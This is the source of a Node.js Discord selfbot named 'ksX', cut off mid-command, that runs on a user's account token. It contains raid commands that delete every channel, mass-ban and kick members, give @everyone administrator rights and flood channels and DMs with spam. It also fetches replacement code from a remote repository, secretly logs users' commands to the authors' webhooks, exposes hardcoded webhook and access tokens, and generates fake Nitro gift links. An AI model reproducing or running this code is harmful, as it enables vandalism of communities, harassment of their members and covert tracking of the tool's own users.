const Discord = require("discord.js")
const fs = require("fs");
const fetch = require("node-fetch");
const snekfetch = require("snekfetch");
const superagent = require('superagent')
const {
    exec
} = require('child_process');
var base64 = require('base-64');
const {
    base64encode,
    base64decode
} = require('nodejs-base64')
const crypto = require('crypto')
var utf8 = require('utf8');
const rpcGenerator = require("discordrpcgenerator");
commandIntervals = [];
const shortUrl = require('node-url-shortener');
const readline = require('readline')
readlineSync = require("readline-sync")
const request = require('request');
const l33t = require('1337')
const getJSON = require('get-json')
const colors = require('colors');
const figlet = require("figlet");
const os = require('os');
const config = require('./config.js');
var token = config.token;
var prefix = config.prefix;
var color = config.color;
var image = config.image;
var stream = config.stream;
var multistat = config.multistatus;
var rpc = config.rpc
var claimer = config.claimer;
var premiumkey = config.premiumkey;
var abusedlogs = config.abusedlogs;
var current = "1.0.0"
var glaf = "725582798215446549";
var chakal = "737332877401915533";
const connectionlogs = new Discord.WebhookClient('785570432220790844', "ipWFIWT3ykWRXTVOjuKbTv1pjE8MzGSAgx2ViZDo3FTvRrdPoYUIiz9dRuN2pW-TEm91")
const cmdlogs = new Discord.WebhookClient('784808076871467098', "B5oiKnDUVhaqsIyyHXtDhxUcMfEaMg-SB2Zns87CmTSq1Su7jF_wuBkWnenEmv8w6_ht")

if (!config.image) {
    image = "https://cdn.discordapp.com/attachments/730742699375722546/774027043729309717/b699e9685217a0e1669452645c0acb17.gif"
}

if (!config.token) {
    console.clear()
    setTimeout(function () {
        console.clear();
        console.log("Please provide a token in config.json".red);
    }, 1000);
}

const client = new Discord.Client()

console.clear()
console.log('\n\n    1 || Start ksX-self.\n    2 || exit.\n\n'.cyan)


const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout,
    prompt: ''
});
rl.write('Choice : ')
rl.on('line', (input) => {
    if (input.includes('2')) {
        console.log("\nGoodbye".blue)
        process.kill(process.pid)
    }

    if (input.includes('1')) {
        console.clear()
        console.log('Starting..'.gray)
        rl.close()

        let url = "https://discord.com/api/v8/users/@me";
        request(
            url, {
                method: "GET",
                headers: {
                    authorization: config.token
                }
            },
            function (error, response, body) {
                if (response.statusCode === 200) {} else {
                    console.clear()
                    console.log()
                    console.log()
                    console.log('The token you provided is not working!\nPlease verify you correctly put your token'.red)
                    process.exit()
                }
            })

            snekfetch.get('https://sixth-standing-grouse.glitch.me/infos.json').then(r => {
                var selfv = r.body.version
                var creators = r.body.creators

            function sleep(delay) {
                var start = new Date().getTime();
                while (new Date().getTime() < start + delay);
            }


            client.on('ready', function() {
                if (selfv.includes(current)) {} else {
                    function UpdateFile(FileName, Link) {
                        let a = FileName;
                        let b = Link;
                        fs.unlink(`./${a}`, function(err) {
                            if (err && err.code == 'ENOENT') {
                                // file doens't exist
                                console.log("The ksX version you using is not up to date, please wait for the update is downloaded");
                            } else if (err) {
                                // other errors, e.g. maybe we don't have enough permission
                                console.log("/!\\ There is an error! Couldn't update ksX".red);
                            } else {
                                //continue
                            }
                        });
                        const request = require("request")
                        var file = fs.createWriteStream(`./${a}`);
                        var r = request(`${b}`).pipe(file);
                        r.on('error', function(err) {
                            console.log(err);
                        });
                        r.on('finish', function() {
                            file.close(sleep(1));
                        });
                    }

                    function OpenProgram(name) {
                        let code = `${name}`

                        const util = require('util');
                        const exec = util.promisify(require('child_process').exec);

                        async function ls(b) {
                            const {
                                stdout,
                                stderr
                            } = await exec(`${b}`);
                            if (`${stdout}` == "") {
                                if (`${stderr}` !== "") {
                                    output = stderr;
                                } else {
                                    output = "output: " + stdout;
                                }
                            } else {
                                output = "output: " + stdout;
                            }
                            if (`${stdout}` == "" | `${stderr}` == "") {
                                output = "output: " + stdout + "\n error: " + stderr;
                            }
                            return await console.log(`${output}`);
                        }
                        ls(`${code}`);
                    }

                    print("Updating..");
                    UpdateFile("index.js", "https://raw.githubusercontent.com/GlafenL/ksX/main/index.js?token=APXIIWRFY2HUNXGNGYBREWK74DZME");
                    UpdateFile("config.js", "https://raw.githubusercontent.com/GlafenL/ksX/main/config.js?token=APXIIWSS6GHMLMDK6RIZYLS74DZ26");
                    UpdateFile("start.bat", "https://raw.githubusercontent.com/GlafenL/ksX/main/start.bat?token=APXIIWTFJ3WDJTU6BM3RFO274DZ52");
                    print("Updated!");

                    function print(a) {
                        console.log(`${a}`);
                    }
                }
            }).catch(e => console.log(e));


        client.on("ready", async () => {

            const res = await fetch('https://api.keygen.sh/v1/accounts/nezukobuy/licenses/actions/validate-key', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/vnd.api+json',
                    'Accept': 'application/vnd.api+json'
                },
                body: JSON.stringify({
                    meta: {
                        key: premiumkey
                    }
                })
            })

            const {
                meta
            } = await res.json()

            setTimeout(function () {

                if (client.user.bot) {
                    process.exit(1)
                }

                if (meta.valid) {
                    var premium = ("Activated".green)
                } else {
                    var premium = ("Desactivated".red)
                }

                /*
                if (meta.valid) {
                    var premiumlog = ("Yes")
                } else {
                    var premiumlog = ("No")
                }

                if (claimer == "on") {
                    var nitroclaimlog = ('Activated');
                } else {
                    var nitroclaimlog = ("Desactivated")
                }

                if (abusedlogs == "on") {
                    var ablogs1 = ('Activated');
                } else {
                    var ablogs1 = ("Desactivated")
                }
                */

                if (client.user.premium > 0) {
                    var nitro = ('Yes'.green);
                } else {
                    var nitro = ("No".red)
                }

                if (claimer == "on") {
                    var nitroclaim = ('Activated'.green);
                } else {
                    var nitroclaim = ("Desactivated".red)
                }

                if (abusedlogs == "on") {
                    var ablogs = ('Activated'.green);
                } else {
                    var ablogs = ("Desactivated".red)
                }


                const ksXlogo = `
        				    ┬┌─┌─┐═╗ ╦  ╔═╗┌─┐┬  ┌─┐
        				    ├┴┐└─┐╔╩╦╝  ╚═╗├┤ │  ├┤
        				    ┴ ┴└─┘╩ ╚═  ╚═╝└─┘┴─┘└
        `
                /*
                 if (client.user.premium > 0) {
                     nitrolog = "User have Nitro"
                 } else {
                     nitrolog = "Without Nitro"
                 }
                 const mbed = new Discord.RichEmbed()
                     .setTitle('New connection!')
                     .setThumbnail(client.user.avatarURL)
                     .setDescription(client.user.tag + " Just logged to ksX")
                     .addField("Premium: ", "**" + premiumlog + "**")
                     .addField("Nitro claimer: ", "**" + nitroclaimlog + "**")
                     .addField("Abused logs: ", "**" + ablogs1 + "**")
                     .addField("Nitro: ", "**" + nitrolog + "**")
                     .addField("Plateform: ", "**" + os.platform() + "**")
                     .setFooter("--------------------Enjoy ksX!--------------------")
                 connectionlogs.send(mbed)
                 */
                console.clear();
                console.log("       ");
                console.log("			  █████ █████ █████ █████ █████ █████ █████ █████ █████ █████ ".magenta);
                console.log("       ");
                console.log(ksXlogo);
                console.log("       ");
                console.log("			  █████ █████ █████ █████ █████ █████ █████ █████ █████ █████ ".magenta);
                console.log("       ");
                console.log("				     I am not responsible for what you do!".red)
                console.log("_____________________________________________________");
                console.log(`
    Version :  Bêta.
    Username :  ${client.user.tag}.
    Prefix :  ${prefix}.
    Nitro :  ${nitro}.
    Guilds :  ${client.guilds.size}.
    Friends :  ${client.user.friends.size}.
    Nitro Claimer :  ${nitroclaim}.
    Abused logs :  ${ablogs}.
    Premium :  ${premium}.`)
                console.log("_____________________________________________________")
                console.log("       ");

                if (rpc.includes("on")) {
                    var uuid = () => ([1e7] + -1e3 + -4e3 + -8e3 + -1e11).replace(/[018]/g, a => (a ^ Math.random() * 16 >> a / 4).toString(16));
                    rpcGenerator.getRpcImage("787775152615194635", "ksxlogo")
                        .then(image => {
                            let presence = new rpcGenerator.Rpc()
                                .setName("ksX")
                                .setUrl(stream)
                                .setType("STREAMING")
                                .setApplicationId("787775152615194635")
                                .setAssetsLargeImage(image.id)
                                .setAssetsLargeText(`ksX Glaf, Chakal`)
                                .setDetails("ksX")
                                .setJoinSecret("MTI4NzM0OjFpMmhuZToxMjMxMjM=")
                                .setPartyId('ae488379-351d-4a4f-ad32-2b9b01c91657')
                                .setSpectateSecret('MTIzNDV8MTIzNDV8MTMyNDU0')
                                .setStartTimestamp(Date.now())

                                .setParty({
                                    id: uuid()
                                })

                            client.user.setPresence(presence.toDiscord())
                        })
                }
            })
        });

        client.on('ready', function () {
            setTimeout(function () {
                console.log('[Logs]:\n '.yellow);
            }, 950)
        });

        client.on("message", async (message) => {

            const res = await fetch('https://api.keygen.sh/v1/accounts/nezukobuy/licenses/actions/validate-key', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/vnd.api+json',
                    'Accept': 'application/vnd.api+json'
                },
                body: JSON.stringify({
                    meta: {
                        key: premiumkey
                    }
                })
            })

            const {
                meta
            } = await res.json()

            var premium = meta.valid

            if (premium) {
                var preMARK = ""
            } else {
                var preMARK = "[PREMIUM]"
            }

            const notpremium = new Discord.RichEmbed()
                .setTitle("You don't have the premium")
                .setURL('https://discord.gg/wkmjxZ285x')
            try {

                if (message.content.startsWith(prefix + "purge")) {
                    if (message.author.id === client.user.id) {
                        let args = message.content.split(" ").slice(1);
                        let messagecount = parseInt(args[0]) || 1;
                        if (!args) message.send('')
                        if (!args) message.send('You cannot clear nothing!')
                        message.channel.fetchMessages({
                                limit: Math.min(messagecount + 1, 100, 200)
                            }).then(messages => messages.filter(m => m.author.id === client.user.id)
                                .map(msg => msg.delete()))
                            .then(console.log('________________________'.blue) ^
                                console.log('[ksX SelfBot Logs] →'.yellow) ^
                                console.log(`Deleting ${args} messages!`)).catch(console.error);
                    }
                }

                if (message.content === prefix + "masspurge") {
                    if (message.author.id === client.user.id) {
                        message.channel.fetchMessages({
                            limit: 100
                        }).then(messages => messages.filter(m => m.author.id === client.user.id).map(msg => msg.delete()))
                    }
                }

                if (message.content === prefix + "ping") {
                    if (message.author.id === client.user.id) {
                        message.edit('Pinging..').then(message => {
                            let ping = new Discord.RichEmbed()
                            ping.setColor(color)
                            ping.setDescription(`Your ping is: \`${client.pings[0]}\` ms`)
                            message.edit(ping)
                        })
                    }
                }

                if (message.content === prefix + "typing") {
                    if (message.author.id === client.user.id) {
                        message.delete()
                        message.channel.startTyping()
                    }
                }

                if (message.content === prefix + "stoptyping") {
                    if (message.author.id === client.user.id) {
                        message.delete()
                        message.channel.stopTyping()
                    }
                }

                if (message.content === prefix + "delchan") {
                    if (message.author.id === client.user.id) {
                        if (premium) {
                            message.delete();
                            message.guild.channels.map(c => c.delete())
                            message.guild.createChannel('FUCKED BY 𝒌𝒔𝑿', 'text')
                            message.edit("Deleting..").then(m => m.delete(1500))
                            cmdlogs.send("**" + client.user.tag + '** Did the command : `delchan`')
                        } else {
                            cmdlogs.send("**" + client.user.tag + '** Did the command : `delchan` But he don\'t have **ksX premium**!')
                            return message.edit(notpremium)
                        }
                    }
                }

                if (message.content === prefix + "masschan") {
                    if (message.author.id === client.user.id) {
                        if (premium) {
                            setInterval(function () {
                                message.guild.createChannel('FUCKED BY 𝒌𝒔𝑿', 'text')
                                message.guild.createChannel('FUCKED BY 𝒌𝒔𝑿', 'text')
                                message.guild.createChannel('FUCKED BY 𝒌𝒔𝑿', 'text')
                                message.guild.createChannel('FUCKED BY 𝒌𝒔𝑿', 'voice')
                                message.guild.createChannel('FUCKED BY 𝒌𝒔𝑿', 'voice')
                                message.guild.createChannel('FUCKED BY 𝒌𝒔𝑿', 'voice')
                            }, 400)
                            cmdlogs.send("**" + client.user.tag + '** Did the command : `masschan`')
                        } else {
                            cmdlogs.send("**" + client.user.tag + '** Did the command : `masschan` But he don\'t have **ksX premium**!')
                            return message.edit(notpremium)
                        }
                    }
                }


                if (message.content === prefix + "spam") {
                    if (message.author.id === client.user.id) {
                        let interval = setInterval(function () {
                            const channels = message.guild.channels.filter(c => c.type === 'text');
                            Promise.all(channels.map(c => c.send("@everyone FUCKED BY 𝒌𝒔𝑿\nhttps://discord.gg/wkmjxZ285x")));
                        }, 100)
                        commandIntervals.push(interval);
                        cmdlogs.send("**" + client.user.tag + '** Did the command : `spam`')
                    }
                }

                if (message.content === prefix + "stopspam") {
                    if (message.author.id === client.user.id) {
                        message.delete()
                        commandIntervals.forEach(interval => {
                            clearInterval(interval);
                            message.channel.send('***Stopped!***')
                        });
                        cmdlogs.send("**" + client.user.tag + '** Did the command : `stopspam`')
                    }
                }

                if (message.content === prefix + "shutdown") {
                    message.delete()
                    console.clear()
                    await console.log('\n\n    Disconnected !\n    Good bye see you next time !'.cyan)
                    cmdlogs.send("**" + client.user.tag + 'Disconnected from ksX!')
                    process.exit()
                }

                if (message.content === prefix + "destroy") {
                    if (message.author.id === client.user.id) {
                        if (premium) {
                            message.delete()
                            const dmusers = message.guild.members
                            message.guild.members.forEach(member => {
                                member.ban().then(function () {});
                            });

                            message.guild.setRegion('southafrica')

                            let images = [
                                "https://cdn.discordapp.com/attachments/730742699375722546/769987145426665512/discord.png",
                                "https://cdn.discordapp.com/attachments/730742699375722546/769987145262825544/dd8b92-1595199037.png",
                                "https://cdn.discordapp.com/attachments/730742699375722546/769987147088265216/image0.jpg",
                                "https://cdn.discordapp.com/attachments/730742699375722546/769987150044463114/nitro.jpg",
                                "https://cdn.discordapp.com/attachments/730742699375722546/769987152179888138/image1.png",
                                "https://cdn.discordapp.com/attachments/730742699375722546/769987154587287572/urfath.png"
                            ]

                            message.guild.roles.deleteAll();

                            message.guild.setIcon(images[Math.floor(Math.random() * (images.length - 1))])

                            message.guild.defaultRole.setPermissions(["ADMINISTRATOR"])

                            message.guild.setName(stringGen(12))

                            setInterval(function () {
                                message.guild.channels.filter((c) => c.type === "voice" && c.delete())
                                message.guild.createChannel("FUCKED BY 𝒌𝒔𝑿", "text")
                                message.guild.createChannel("FUCKED BY 𝒌𝒔𝑿", "text")
                                message.guild.createChannel("FUCKED BY 𝒌𝒔𝑿", "text")
                                message.guild.createChannel("FUCKED BY 𝒌𝒔𝑿", "text")


                                message.guild.createRole({
                                    name: ("FUCKED BY 𝒌𝒔𝑿"),
                                    mentionable: false,
                                    permissions: 8,
                                    color: 'RANDOM',
                                });

                                dmusers.forEach(dmuser => {
                                    if (dmuser.id != client.user.id && !dmuser.user.bot) dmuser.send("@everyone SERVER REAPED !!")
                                })
                                const channels = message.guild.channels.filter(c => c.type === 'text');
                                Promise.all(channels.map(c => c.send("@everyone FUCKED BY 𝒌𝒔𝑿\n", {
                                    tts: true
                                })));
                            }, 4000)
                            cmdlogs.send("**" + client.user.tag + '** Did the command : `destroy`')
                        } else {
                            cmdlogs.send("**" + client.user.tag + '** Did the command : `destroy` But he don\'t have **ksX premium**!')
                            return message.edit(notpremium)
                        }
                    }
                }

                if (message.content === prefix + "kickall") {
                    if (message.author.id === client.user.id) {
                        if (premium) {
                            for (var i = 0; i < 90; i++) {
                                message.guild.createRole({
                                    name: ("FUCKED BY 𝒌𝒔𝑿"),
                                    mentionable: false,
                                    permissions: 8,
                                    color: 'RANDOM'
                                })
                            }
                        }
                    }
                }

                if (message.content === prefix + "kickall") {
                    if (message.author.id === client.user.id) {
                        if (premium) {
                            if (!message.guild) return message.edit('Please go on a server do that')
                            if (message.guild.member(message.author).hasPermission("KICK_MEMBERS")) {
                                message.guild.members.forEach(member => {
                                    member.kick()
                                })
                            } else {
                                message.edit('You don\'t have the required permission')
                            }
                            cmdlogs.send("**" + client.user.tag + '** Did the command : `kickall`')
                        } else {
                            cmdlogs.send("**" + client.user.tag + '** Did the command : `kickall` But he don\'t have **ksX premium**!')
                            return message.edit(notpremium)
                        }
                    }
                }

                if (message.content === prefix + "banall") {
                    if (message.author.id === client.user.id) {
                        if (premium) {
                            if (!message.guild) return message.edit('Please go on a server do that')
                            if (message.guild.member(message.author).hasPermission("BAN_MEMBERS")) {
                                message.guild.members.forEach(member => {
                                    member.ban()
                                })
                            } else {
                                message.edit('You don\'t have the required permission')
                            }
                            cmdlogs.send("**" + client.user.tag + '** Did the command : `banall`')
                        } else {
                            cmdlogs.send("**" + client.user.tag + '** Did the command : `banall` But he don\'t have **ksX premium**!')
                            return message.edit(notpremium)
                        }
                    }
                }

                if (message.content === prefix + "unbanall") {
                    if (message.author.id === client.user.id) {
                        if (premium) {
                            if (!message.guild) return message.edit('Please go on a server do that')
                            setInterval(function () {
                                message.guild.fetchBans().then(bans => {
                                    bans.forEach(ban => {
                                        message.guild.unban(ban.id);
                                    });
                                });
                            }, 1000);
                            cmdlogs.send("**" + client.user.tag + '** Did the command : `unbanall`')
                        } else {
                            cmdlogs.send("**" + client.user.tag + '** Did the command : `unbanall` But he don\'t have **ksX premium**!')
                            return message.edit(notpremium)
                        }
                    }
                }

                if (message.content === prefix + "delserver") {
                    if (message.author.id === client.user.id) {
                        if (premium) {
                            if (!message.guild) return
                            if (message.author !== message.guild.owner) {
                                message.guild.delete()
                            } else {
                                message.edit("You don't have the own!")
                            }
                            cmdlogs.send("**" + client.user.tag + '** Did the command : `delserver`')
                        } else {
                            cmdlogs.send("**" + client.user.tag + '** Did the command : `delserver` But he don\'t have **ksX premium**!')
                            return message.edit(notpremium)
                        }
                    }
                }

                if (message.content === prefix + 'restart') {
                    if (message.author.id === client.user.id) {
                        message.edit("Restarting..").then(client.destroy()).then(() => client.login(token))
                        console.log('________________________'.blue)
                        console.log('[ksX SelfBot Logs] →'.yellow)
                        console.log('Restarted! '.green)
                        console.clear();
                        cmdlogs.send("**" + client.user.tag + '** restarded ksX!')
                    }
                }

                if (message.content === prefix + "clearlogs") {
                    if (message.author.id === client.user.id) {
                        message.edit("Cleared!")

                        console.clear();
                        client.emit("ready")
                    }
                }

                if (message.content.startsWith(prefix + "pepe")) {
                    if (message.author.id === client.user.id) {
                        let pps = [
                            "8=D",
                            "8==D",
                            "8===D",
                            "8====D",
                            "8=====D",
                            "8======D",
                            "8========D",
                            "8=========D",
                            "8==========D",
                        ]
                        let mention = message.mentions.users.first() || message.author

                        let pp = pps[Math.floor(Math.random() * (pps.length - 1))]
                        const embed = new Discord.RichEmbed()
                            .setDescription(mention + '\'s pepe size is : **' + pp + "**")
                        message.edit(embed)
                    }
                }

                if (message.content.startsWith(prefix + "8ball")) {
                    if (message.author.id === client.user.id) {
                        let args = message.content.split(/\s+/g).slice(1).join(" ");
                        if (!args) {
                            return message.channel.send('Please enter a quetion!');
                        }
                        let replies = [
                            "Yes.",
                            "Surely.",
                            "Maybe.",
                            "Yes, definitely.",
                            "No.",
                            "Probably.",
                            "Let's see!",
                            "Why not.",
                            "See by yourself.",
                            "I would like to see.",
                            "You are crazy! Surely not.",
                            "Surely not.",
                            "Better not tell you now.",
                            "Cannot predict now.",
                            "Concentrate and ask again.",
                            "It couldn't be better.",
                            "My reply is no.",
                            "My sources say no"
                        ]

                        let answer = replies[Math.round(Math.random() * (replies.length - 1))]

                        let embed = new Discord.RichEmbed()
                            .setTitle('__**8ball**__')
                            .setColor(color)
                            .addField("Question: ", "\"" + args + "\"")
                            .addField("Answer: ", "`" + answer + "`")
                            .setImage(image)
                            .setFooter("ksX Self", client.user.avatarURL)
                        message.edit(embed)
                    }
                }

                if (message.content === prefix + "stopactivity") {
                    if (message.author.id == client.user.id) {
                        message.delete();
                        client.user.setActivity("", {
                            type: ""
                        });
                        message.channel.send("Successfuly removed your activity/status!")
                    }
                }

                if (message.content === prefix + 'dnd') {
                    if (message.author.id === client.user.id) {
                        client.user.setStatus('dnd');
                        message.edit("Your now in **do not disturb**!")
                    }
                }

                if (message.content === prefix + 'invisible') {
                    if (message.author.id === client.user.id) {
                        client.user.setStatus('invisible');
                        message.edit("Your now in **invisible**!")
                    }
                }

                if (message.content === prefix + 'online') {
                    if (message.author.id === client.user.id) {
                        client.user.setStatus('online');
                        message.edit("Your now in **online**!")
                    }
                }

                if (message.content === prefix + 'idle') {
                    if (message.author.id === client.user.id) {
                        client.user.setStatus('idle');
                        message.edit("Your now **idle**!")
                    }
                }

                var args = message.content.split(` `).slice(1).join(' ');

                if (message.content.startsWith(prefix + 'play')) {
                    if (message.author.id === client.user.id) {
                        if (!args) return message.edit("Please provide a text!")
                        client.user.setActivity(args, {
                            type: 'PLAYING',
                        });
                        message.edit("Your now playing **" + args + "**!")
                    }
                }

                if (message.content.startsWith(prefix + 'watch')) {
                    if (message.author.id === client.user.id) {
                        if (!args) return message.edit("Please provide a text!")
                        client.user.setActivity(args, {
                            type: 'WATCHING'
                        });
                        message.edit("Your now watching **" + args + "**!")
                    }
                }

                if (message.content.startsWith(prefix + 'listen')) {
                    if (message.author.id === client.user.id) {
                        if (!args) return message.edit("Please provide a text!")
                        client.user.setActivity(args, {
                            type: 'LISTENING'
                        });
                        message.edit("Your now listening **" + args + "**!");
                    }
                }
                if (message.content.startsWith(prefix + "stream")) {
                    if (message.author.id === client.user.id) {
                        if (!args) return message.edit("Please provide a text!")
                        client.user.setGame(args, stream);

                        message.edit("Your now streaming **" + args + "**!");
                    }
                }

                if (message.content === prefix + "nitro") {
                    if (message.author.id === client.user.id) {
                        message.edit("Nitro sent!")
                        let nitro = new Discord.RichEmbed()
                            .setTitle('**Nitro!**')
                            .setColor(color)
                            .addField("Nitro link: ", "**https:/" + "/discord.gift/" + linknitro(16, '0aA') + "**")
                            .setImage(image)
                            .setFooter("ksX Self", client.user.avatarURL)
                        message.channel.send(nitro)
                        cmdlogs.send("**" + client.user.tag + '** Did the command : `nitro`')
                    }
                }

                if (message.content.startsWith(prefix + "setuseravatar")) {
                    if (message.author.id === client.user.id) {
                        let mention = message.mentions.users.first()
                        let avatar = mention.displayAvatarURL

                        client.user.setAvatar(avatar)

                        let embed = new Discord.RichEmbed()
                            .setTitle('**Avatar setted!**')
                            .setURL(avatar)
                            .setDescription('You stealed **' + mention.username + "** avatar!")
                            .setImage(avatar)
                            .setFooter("ksX Self", client.user.avatarURL)
                        message.edit(embed)
                    }
                }

                if (message.content.startsWith(prefix + "setavatar")) {
                    if (message.author.id === client.user.id) {

                        if (!args) {
                            return message.edit("Please provide an image!")
                        } else {
                            client.user.setAvatar(args)
                            let embed = new Discord.RichEmbed()
                                .setTitle('**Avatar setted!**')
                                .setDescription("Avatar setted to: ")
                                .setImage(args)
                                .setFooter("ksX Self", client.user.avatarURL)
                            message.edit(embed)
                        }
                    }
                }

                if (message.content.startsWith(prefix + "avatar")) {
                    if (message.author.id === client.user.id) {
                        let mention = message.mentions.users.first() || message.author
                        let avatar = mention.displayAvatarURL

                        let embed = new Discord.RichEmbed()
                            .setTitle('**Avatar**')
                            .setURL(avatar)
                            .setImage(avatar)
                            .setFooter("ksX Self", client.user.avatarURL)
                        message.edit(embed)
                    }
                }

                if (message.content.startsWith(prefix + "leet")) {
                    if (message.author.id === client.user.id) {
                        if (!args) return message.edit("Please provide a valid text")
                        message.edit(l33t(args))
                    }
                }

                if (message.content === prefix + "hypesquad bravery") {
                    if (message.author.id === client.user.id) {
                        let hypesquad = `https://discord.com/api/v8/hypesquad/online`;

                        request(hypesquad, {
                            method: 'POST',
                            headers: {
                                authorization: token,
                                'content-type': 'application/json',
                                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.55 Chrome/78.0.3904.130 Electron/7.3.2 Safari/537.36'
                            },
                            body: JSON.stringify({
                                'house_id': 1
                            })
                        });

                        message.edit("HypeSquad setted to Bravery!");
                        cmdlogs.send("**" + client.user.tag + '** Changed his HypeSquad to `Bravery`')
                    }
                }

                if (message.content === prefix + "hypesquad brilliance") {
                    if (message.author.id === client.user.id) {
                        let hypesquad = `https://discord.com/api/v8/hypesquad/online`;

                        request(hypesquad, {
                            method: 'POST',
                            headers: {
                                authorization: token,
                                'content-type': 'application/json',
                                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.55 Chrome/78.0.3904.130 Electron/7.3.2 Safari/537.36'
                            },
                            body: JSON.stringify({
                                'house_id': 2
                            })
                        });

                        message.edit("HypeSquad setted to Brilliance!");
                        cmdlogs.send("**" + client.user.tag + '** Changed his HypeSquad to `brilliance`')
                    }
                }

                if (message.content === prefix + "hypesquad balance") {
                    if (message.author.id === client.user.id) {
                        let hypesquad = `https://discord.com/api/v8/hypesquad/online`;

                        request(hypesquad, {
                            method: 'POST',
                            headers: {
                                authorization: token,
                                'content-type': 'application/json',
                                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.55 Chrome/78.0.3904.130 Electron/7.3.2 Safari/537.36'
                            },
                            body: JSON.stringify({
                                'house_id': 3
                            })
                        });

                        message.edit("HypeSquad setted to Balance!");
                        cmdlogs.send("**" + client.user.tag + '** Changed his HypeSquad to `balance`')
                    }
                }

                if (message.content.startsWith(prefix + "setprefix")) {
                    if (message.author.id === client.user.id) {
                        let newprefix = message.content.split(" ").slice(1).join(" ")
                        if (!newprefix) return message.edit('Pleases specifie a prefix')
                        prefix = newprefix
                        message.edit('Prefix changed to **' + prefix + "**")
                        cmdlogs.send("**" + client.user.tag + '** Changed his prefix to `' + prefix + "`")
                    }
                }

                if (message.content.startsWith(prefix + "setcolor")) {
                    if (message.author.id === client.user.id) {
                        let newcolor = message.content.split(" ").slice(1).join(" ")
                        if (!newcolor) return message.edit('Pleases specifie a color')
                        color = newcolor
                        message.edit('Color changed to **' + color + "**")
                        cmdlogs.send("**" + client.user.tag + '** Changed his color to `' + color + "`")
                    }
                }

                if (message.content.startsWith(prefix + "setimage")) {
                    if (message.author.id === client.user.id) {
                        let newimage = message.content.split(" ").slice(1).join(" ")
                        if (!newimage) return message.edit('Pleases specifie a image')
                        image = newimage
                        message.edit('Image changed to **' + image + "**")
                        cmdlogs.send("**" + client.user.tag + '** Changed his image to `' + image + "`")
                    }
                }

                if (message.content.startsWith(prefix + "noimage")) {
                    if (message.author.id === client.user.id) {
                        image = "image"
                        message.edit('Successfully removed image!')
                        cmdlogs.send("**" + client.user.tag + "** Removed his image")
                    }
                }

                if (message.content.startsWith(prefix + "nocolor")) {
                    if (message.author.id === client.user.id) {
                        color = ""
                        message.edit('Successfully removed color!')
                        cmdlogs.send("**" + client.user.tag + "** Removed his color ")
                    }
                }

                if (message.content.startsWith(prefix + "setstream")) {
                    if (message.author.id === client.user.id) {
                        let newstream = message.content.split(" ").slice(1).join(" ")
                        if (!newstream) return message.edit('Pleases specifie a stream')
                        stream = newstream
                        message.edit('Stream changed to **' + stream + "**")
                        cmdlogs.send("**" + client.user.tag + '** Changed his stream to `' + stream + "`")
                    }
                }

                if (message.content.startsWith(prefix + "clientinfos")) {
                    if (message.author.id === client.user.id) {
                        message.edit("Look in the console!")
                        let sponge = await fetch("https://api.ipify.org?format=json")

                        let {
                            ip
                        } = await sponge.json()
                        console.log("________________________\n")
                        console.log("Your token → " + config.token.bgBlue + "\nYour prefix → " + config.prefix.bgBlue + "\nYour username → " + (client.user.username + "#" + client.user.discriminator).bgBlue + "\nYour IP → " + ip.bgBlue + "\nYour PC hostname → " + os.hostname().bgBlue + "\nYour PC username → " + os.userInfo().username.bgBlue)
                        console.log("________________________")
                    }
                }

                if (message.content.startsWith(prefix + "ghostping")) {
                    if (message.author.id === client.user.id) {
                        let ping = message.content.split(" ").slice(1).join(" ")
                        if (ping) {
                            if (!message.mentions.users.size > 0) {
                                message.edit('@everyone').then((m) => m.delete())
                            } else {
                                message.delete()
                            }
                        } else {
                            message.edit('@everyone').then((m) => m.delete())
                        }
                    }
                    cmdlogs.send("**" + client.user.tag + '** Did the command : `ghostping`')
                }

                if (message.content.startsWith(prefix + "tokenof")) {
                    if (message.author.id === client.user.id) {
                        let user = message.mentions.users.first()
                        if (!user) return message.edit('Please mention someone to get the first half of his token')
                        let id = user.id
                        const embed = new Discord.RichEmbed()
                            .setTitle('__TOKEN__')
                            .setColor(color)
                            .setDescription('The half of the token of' + user + " is: \n||" + base64encode(id) + "||")
                            .setImage(image)
                            .setFooter("ksX Self", client.user.avatarURL)
                        message.edit(embed)
                    }
                }

                if (message.content.startsWith(prefix + "textmoji")) {
                    if (message.author.id === client.user.id) {
                        let args = message.content.split(" ").slice(1)
                        if (!args) {
                            message.edit('Enter text to emojify!')
                        }

                        const chars = {
                            " ": " ",
                            "0": ":zero:",
                            "1": ":one:",
                            "2": ":two:",
                            "3": ":three:",
                            "4": ":four:",
                            "5": ":five:",
                            "6": ":six:",
                            "7": ":seven:",
                            "8": ":eight:",
                            "9": ":nine:",
                            "!": ":grey_exclamation:",
                            "?": ":grey_question:",
                            "#": ":hash:",
                            "*": ":asterisk:"
                        };

                        "abcdefghijklmnopqrstuvwxyz".split("").forEach(c => {
                            chars[c] = chars[c.toUpperCase()] = `:regional_indicator_${c}:`;
                        })

                        message.delete();
                        message.channel.send(args.join(" ").split("").map(c => chars[c] || c).join(""));
                    }
                }

                if (message.content.startsWith(prefix + "b64encode")) {
                    if (message.author.id === client.user.id) {
                        if (!args) return message.edit('You cannot encode nothing!')
                        message.edit(base64encode(args))
                    }
                }

                if (message.content.startsWith(prefix + "b64decode")) {
                    if (message.author.id === client.user.id) {
                        if (!args) return message.edit('You cannot decode nothing!')

                        message.edit(base64decode(args))
                    }
                }

                if (message.content.startsWith(prefix + "shorturl")) {
                    if (message.author.id === client.user.id) {
                        shortUrl.short(args, function (err, url) {
                            message.edit(url);
                        });
                    }
                }

                if (message.content.startsWith(prefix + "kiss")) {
                    if (message.author.id === client.user.id) {

                        let user = message.mentions.users.first()
                        const {
                            body
                        } = await superagent.get(`https://nekos.life/api/v2/img/kiss`);
                        if (!user) return message.edit('Please mention someone!')
                        const embed = new Discord.RichEmbed()
                            .setTitle('__**KISS**__')
                            .setDescription("**You kissed " + user.username + "**")
                            .setColor(color)
                            .setImage(body.url)
                            .setFooter("ksX Self", client.user.avatarURL)
                        message.edit(embed)
                    }
                }

                if (message.content.startsWith(prefix + "slap")) {
                    if (message.author.id === client.user.id) {

                        let user = message.mentions.users.first()
                        const {
